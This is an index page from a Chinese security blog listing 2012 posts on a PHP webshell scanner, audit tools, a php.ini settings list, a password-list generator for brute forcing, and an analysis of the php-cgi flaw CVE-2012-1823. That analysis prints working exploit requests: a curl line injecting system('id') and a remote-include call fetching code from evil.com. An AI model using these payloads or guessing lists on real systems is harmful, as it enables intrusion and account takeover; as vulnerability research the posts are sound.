
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Ourren</title>
  <meta name="author" content="ourren">

  
  <meta name="description" content="通过两种扫描方式（关键字匹配、token语句分析）实现对webshell后门的检测。可以针对目录批量扫描，也可以对单个文件通过token分析其语句。其中关于php tokens解析方法在浅谈php中的词法分析 有提到具体实现，实际情况还是得结合敏感函数，不过相对而加密后的文件应该效果更好, &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://blog.ourren.com/blog/posts/9/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="Ourren" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.useso.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.useso.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.useso.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">Ourren</a></h1>
  
    <h2>关注技术，记录生活.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="blog.ourren.com/blog">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
    <li><a href="/">Home</a></li>
    <li><a href="http://www.ourren.com">Ourren</a></li>
    <li><a href="http://www.sec-wiki.com">SecWiki</a></li>
    <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2012/06/08/php_webshell_scan_tool/">Php Webshell Scan Tool</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-06-08T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2012/06/08/php_webshell_scan_tool/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>通过两种扫描方式（关键字匹配、token语句分析）实现对webshell后门的检测。可以针对目录批量扫描，也可以对单个文件通过token分析其语句。其中关于php tokens解析方法在<a href="/2012/03/20/php_lexical_analysis.html">浅谈php中的词法分析 </a>有提到具体实现，实际情况还是得结合敏感函数，不过相对而加密后的文件应该效果更好,具体检测原理见Monyer的文章<a href="http://hi.baidu.com/monyer/item/a218dbadf2afc7a828ce9d63">常见 Webshell 的检测方法及检测绕过思路</a>。通过实际测试发现：alibaba在t00ls发布的scanner.php工具可以检测出现有的大部分后门，效果不错。</p>

<p>本工具只是整合了alibaba和Monyer两种扫描方法和代码，在此表示感谢。</p>

<p>测试效果如图：</p>

<p><a href="http://ourren.b0.upaiyun.com/simplescan.jpg"><img class="aligncenter" title="simplescan" src="http://ourren.b0.upaiyun.com/simplescan.jpg" alt="" width="1024" height="450"></a></p>

<p> </p>

<p>工具下载：<a href="http://code.google.com/p/ourren/downloads/list">下载</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2012/06/08/dencode_tool/">编解码工具 DEncode1.1 更新</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-06-08T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2012/06/08/dencode_tool/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>DEncode1.1更新说明<br>1、增加了LM、NT、LM/NThash加密方式。<br>2、增加了原来漏掉的HTML解码功能。<br>3、增加了字符替换功能。
DEncode1.0 介绍文章：<a href="http://www.ourren.com/blog/encoding-and-decoding-tools-decode.html">链接<br></a>工具下载：<a href="http://code.google.com/p/ourren/downloads/list">下载</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2012/06/01/psatv1-0/">php源码审计工具(Psat简介)</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-06-01T00:00:00-07:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2012/06/01/psatv1-0/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>在php源码审计的时候，需要根据自己的字典进行搜索并进行分析，因此php 安全字典很重要，<a href="/2012/05/31/php_audit_dictionary.html">上一篇文章</a>总结了常见安全方面的PHP函数。Windows下我们可以通过“Search and Replace”工具结合字典进行搜索，而linux下可以通过借鉴强大的grep命令进行搜索，但是针对不同类型漏洞需要记住很多命令和参数，这样导致使用不方便。前几天刚好看到<a href="http://www.0x50sec.org/%E4%B8%80%E4%B8%AA%E7%AE%80%E9%99%8B%E7%9A%84php%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BE%85%E5%8A%A9%E8%84%9A%E6%9C%AC/">c4rp3nt3r</a>开源的工具，由于作者使用的是perl进行开发，通过对源码和字典关键字分析进行了二次开发，特点如下：</p>

<p>1、字典中增加了一些函数</p>

<p>2、多文件搜索时默认显示不是很方便，因此可以使用选项生成报告。</p>

<p>3、再次开发更方便，直接增加字典</p>

<p>软件截图：</p>

<p><a href="http://ourren.b0.upaiyun.com/psat1.jpg"><img class="aligncenter" title="psat" src="http://ourren.b0.upaiyun.com/psat1.jpg" alt="" width="534" height="199"></a></p>

<p>软件下载地址：<a href="http://code.google.com/p/ourren/downloads/detail?name=psat%20v1.0.rar">连接</a></p>

<p>在此感谢:<a href="http://www.0x50sec.org/%E4%B8%80%E4%B8%AA%E7%AE%80%E9%99%8B%E7%9A%84php%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%BE%85%E5%8A%A9%E8%84%9A%E6%9C%AC/">c4rp3nt3r</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2012/05/31/php_audit_dictionary/">PHP源码审计字典</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-05-31T00:00:00-07:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>31</span><span class='date-suffix'>st</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2012/05/31/php_audit_dictionary/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>对涉及PHP安全方面的函数进行了归类，参照了很多文章和博客，在此表示感谢。
[code lang=&ldquo;php&rdquo;]1.include/require/require_once/include_once/file_get_contents
2.exec/system/popen/passthru/proc_open/pcntl_exec/shell_exec
3.eval/preg_replace/assert/call_user_func/call_user_func_array/create_function
4.<em>GET/</em>POST/<em>COOKIE/</em>SERVER/<em>REQUEST/</em>ENV/php://input/getenv/
5.session/cookie
6.extract/parse_str/mb_parse_str/import_request_variables/unserialize
7.copy/rmdir/chmod/delete/fwrite/fopen/readfile/fpassthru/move_uploaded_file/
file_put_contents/unlink/upload/opendir/fgetc/fgets/ftruncate/fputs/fputcs
8.select/insert/update/delete/order by/group by/limit/in(/stripslashes/urldecode
9.confirm_phpdoc_compiled/mssql_pconnect/mssql_connect/crack_opendict/
snmpget/ibase_connect
10.echo/print/printf/vprintf/document.write/document.innerHTML/document.innerHtmlText
11.phpinfo/highlight_file/show_source
12.iconv/mb_convert_encoding[/code]
附带php.ini中涉及安全配置选项。
[code lang=&ldquo;php&rdquo;]safe_mode = off ( a lot of shit cannot be done with this on )
disabled_functions = N/A ( no one,we want all )
register_globals = on ( we can set variables by request )
allow_url_include = on ( for lfi/rfi )
allow_url_fopen = on ( for lfi/rfi )
magic_quotes_gpc = off ( this will escape &lsquo; &ldquo;    and NUL&rsquo;s  with a backslash and we don&rsquo;t want that )
short_tag_open = on ( some scripts are using short tags,better on )
file_uploads = on ( we want to upload )
display_errors = on ( we want to see the script errors,maybe some undeclared variables? )
open_basedir 限制访问目录
display_errors = off 显示错误信息[/code]</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2012/05/04/cve-2012-1823-analyse/">CVE-2012-1823 漏洞原理分析</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-05-04T00:00:00-07:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2012/05/04/cve-2012-1823-analyse/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>首先说明只是自己的一些理解和看法，能力有限如有错误望请指正，谢谢。
1、php三种模式
php运行一般有三种运行模式:CGI模式、DLL模式、FastCGI模式。
CGI模式：如果客户机请求一个php文件，Web服务器就调用php.exe(php5:php-cgi.exe)去解释这个文件，然后再把解释的结果以网页的形式返回给客户机,fork-and-execute 模式。
DLL模式：Apache直接加载模块进行启动。
FastCGI模式：FastCGI是cgi的升级版本，启动后一直运行，不需要每次都fork一次。</p>

<p>2、整体流程
在这个RCE中，触发的整体过程如下:
用户提交的数据&mdash;>判定提交数据中是否有未编码的&#8217;=&lsquo;&ndash;(无)&ndash;>对该字符串进行解析&mdash;->转义元字符&mdash;->生成命令参数列表&mdash;->提交给CGI程序&mdash;->CGI进行处理。
从CGI RFC的标准说起，原文：</p>

<blockquote>4.4.  The Script Command Line

Some systems support a method for supplying an array of strings to
the CGI script.  This is only used in the case of an &#8216;indexed&#8217; HTTP
query, which is identified by a &#8216;GET&#8217; or &#8216;HEAD&#8217; request with a URI
query string that does not contain any unencoded &#8220;=&#8221; characters.  For
such a request, the server SHOULD treat the query-string as a
search-string and parse it into words, using the rules

search-string = search-word *( &#8220;+&#8221; search-word )
search-word   = 1*schar
schar         = unreserved | escaped | xreserved
xreserved     = &#8220;;&#8221; | &#8220;/&#8221; | &#8220;?&#8221; | &#8220;:&#8221; | &#8220;@&#8221; | &#8220;&&#8221; | &#8220;=&#8221; | &#8220;,&#8221; |
&#8221;$&#8221;

After parsing, each search-word is URL-decoded, optionally encoded in
a system-defined manner and then added to the command line argument
list.

If the server cannot create any part of the argument list, then the
server MUST NOT generate any command line information.  For example,
the number of arguments may be greater than operating system or
server limits, or one of the words may not be representable as an
argument.

The script SHOULD check to see if the QUERY_STRING value contains an
unencoded &#8220;=&#8221; character, and SHOULD NOT use the command line
arguments if it does.</blockquote>


<p>理解：
一些系统为了让CGI程序获取查询参数。处理如下,只允许有索引的查询（比如说GET,HEAD，同时提交参数中不能有未编码的&#8217;=&lsquo;），成功的话服务端程序就需要把这个查询字符当做搜索字符，并解析为不同字符，并按照规则进行处理，例如：
[code lang=&ldquo;php&rdquo;]      search-string = search-word <em>( &ldquo;+&rdquo; search-word )  //查询字符
      search-word   = 1</em>schar                            //提交的字符
      schar         = unreserved | escaped | xreserved    //解析后的结果
      xreserved     = &ldquo;;&rdquo; | &ldquo;/&rdquo; | &ldquo;?&rdquo; | &ldquo;:&rdquo; | &ldquo;@&rdquo; | &ldquo;&amp;&rdquo; | &ldquo;=&rdquo; | &ldquo;,&rdquo; | &ldquo;$&rdquo;    //需要转义的字符[/code]
通过解析后，就把这些字符添加到参数列表中。如果服务器不能创建参数列表，那么就不需要生成任何命令信息。同时如果查询参数中包含有未编码的&rsquo;=&lsquo;，那么就不用解析参数。
通过对Apache处理CGI RFC中发现，如果查询字符中未包含未编码的&rsquo;=&lsquo;，那么字符就会用&rsquo;+&lsquo;(编码的空格)符号进行分割，然后进行元字符转义，最后传递给CGI程序。
但是不幸的是，PHP开发者忘记了RFC这部分内容，在2004年移除了这部分与其他地方冲突的代码，原文如下：</p>

<blockquote>From: Rasmus Lerdorf <rasmus <at> lerdorf.com>
Subject: [PHP-DEV] php-cgi command line switch memory check
Newsgroups: gmane.comp.php.devel
Date: 2004-02-04 23:26:41 GMT (7 years, 49 weeks, 3 days, 20 hours and 39 minutes ago)

In our SAPI cgi we have a check along these lines:

if (getenv(&#8220;SERVER_SOFTWARE&#8221;)
|| getenv(&#8220;SERVER_NAME&#8221;)
|| getenv(&#8220;GATEWAY_INTERFACE&#8221;)
|| getenv(&#8220;REQUEST_METHOD&#8221;)) {
cgi = 1;
}
//在这里进行判定，如果CGI程序运行在网络环境中，不对提交的参数进行解析，这样是没有漏洞的，但是由于某些原因进行了移除。

if(!cgi) getopt(&#8230;)

As in, we do not parse command line args for the cgi binary if we are
running in a web context.  At the same time our regression testing system
tries to use the cgi binary and it sets these variables in order to
properly test GET/POST requests.  From the regression testing system we
use -d extensively to override ini settings to make sure our test
environment is sane.  Of course these two ideas conflict, so currently our
regression testing is somewhat broken.  We haven&#8217;t noticed because we
don&#8217;t have many tests that have GET/POST data and we rarely build the cgi
binary.</blockquote>


<p>3、利用
查看php-cgi.exe的参数。
-s               Display colour syntax highlighted source.
-d foo[=bar]     Define INI entry foo with value &lsquo;bar&rsquo;
-n               No php.ini file will be used
导致的漏洞可以源码泄漏，本地包含和远程包含，copy GaRY的利用代码。
(1)本地包含直接执行代码:
curl -H &ldquo;USER-AGENT: &lt;?system(&lsquo;id&rsquo;);die();?>&rdquo; <a href="http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n">http://target.com/test.php?-dauto_prepend_file%3d/proc/self/environ+-n</a></p>

<p>(2)远程包含执行代码:
curl <a href="http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt">http://target.com/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</a></p>

<p>(3)查看源码
<a href="http://target.com/test.php?-s">http://target.com/test.php?-s</a>
自己看了下php5中的php-cgi.exe貌似没有-r参数。</p>

<p>4、参考：
<a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a>
<a href="http://zone.wooyun.org/content/151">http://zone.wooyun.org/content/151</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/2012/04/18/sdgt_brute_dic_tool/">Sdgt Project简介</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2012-04-18T00:00:00-07:00'><span class='date'><span class='date-month'>Apr</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>12:00 am</span></time>
        
        
            | <a href="/2012/04/18/sdgt_brute_dic_tool/#comments">留言</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>1、关于
Sdgt(social dictionary generate tool)通过收集到的敏感信息，结合国人密码心理学，实现了一个简单的密码生成工具，可以在暴力破解方面使用。
2、配置
文件采用UTF8编码，template.txt中收集中csdn中top1000密码，可以把template.txt复制进行修改。每行&#8221;:&ldquo;前面是密码因子，后面的部分是值并用分号隔开，例如：
name:zhang san;li si
qq:10000;10010
idcard:100121190000111234
subpw:123qaz;qaz
nickname:boy;good;sec
year:2012;2011;2010
domain:sina;google
3、使用
sdgt.py  C:zhang.txt C:zhangdic.txt
4、规则
结合国人密码学，采用了如下的一些规则。
<a href="http://ourren.b0.upaiyun.com/sdgt.png"><img class="aligncenter" title="sdgt" src="http://ourren.b0.upaiyun.com/sdgt.png" alt="" width="410" height="315"></a></p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/10">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/8">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
    <h1>分类目录</h1>
    <ul>
        <li>
            <a href="http://blog.ourren.com/categories/life" title="life thing and think">生活</a>
        </li>
        <li><a href="http://blog.ourren.com/categories/research" title="do some research in daily life">研究</a>
        </li>
        <li><a href="http://blog.ourren.com/categories/security" title="all security articles">安全</a>
        </li>
        <li><a href="http://blog.ourren.com/categories/technology" title="all program and code">技术</a>
        </li>
    </ul>
</section><section>
    <h1>友情链接</h1>
    <ul>
        <li><a href="http://ohroot.com/" target="_blank">Direwolf</a></li>
        <li><a href="http://www.insight-labs.org/">insight-labs</a></li>
        <li><a href="http://lx.shellcodes.org/">lu4nx</a></li>
        <li><a href="http://www.metasploit.cn/forum.php" title="Metasploit 中文站" target="_blank">Metasploit</a></li>
        <li><a href="http://www.ourren.com/" target="_blank">ourren</a></li>
    </ul>
</section>
  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - ourren -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  











</body>
</html>
